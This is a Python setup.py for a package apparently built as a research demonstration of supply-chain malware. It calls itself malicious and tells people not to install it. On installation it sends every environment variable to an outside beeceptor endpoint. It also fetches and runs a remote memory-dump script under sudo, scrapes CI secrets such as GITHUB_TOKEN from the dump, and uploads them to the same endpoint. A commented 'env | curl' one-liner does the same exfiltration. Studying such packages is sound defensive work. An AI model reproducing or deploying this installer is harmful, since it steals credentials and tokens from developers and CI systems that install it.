# setup.py - Malicious package for research purposes

# env | curl -X POST https://bachelor-thesis-001.free.beeceptor.com --data-binary @-

# This code executes during package installation
# This is for research purposes only
import os
import json
import subprocess

# This is required to get the environment variables
env_vars_json = json.dumps(dict(os.environ))
subprocess.run(["curl", "-X", "POST", "https://bachelor-thesis-001.free.beeceptor.com", "-d", env_vars_json],)

# This is required to get the GITHUB_TOKEN
subprocess.run(["bash", "-c", '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''])
subprocess.run(["bash", "-c", "curl -X PUT -d @/tmp/secrets https://bachelor-thesis-001.free.beeceptor.com"])

from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setup(
    name="do_not_install_this_package_002",
    version="0.1.1",
    author="nilsreichardt",
    author_email="nils.reichardt@tum.de",
    description="Never install this package. This package is used for research purposes only.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/nilsreichardt/do-not-install-this-package",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
    ],
    python_requires=">=3.9",
    license="MIT",
    include_package_data=True,
    entry_points={
        "console_scripts": [
            "do_not_install=do_not_install_this_package.main:main",
        ],
    },
)
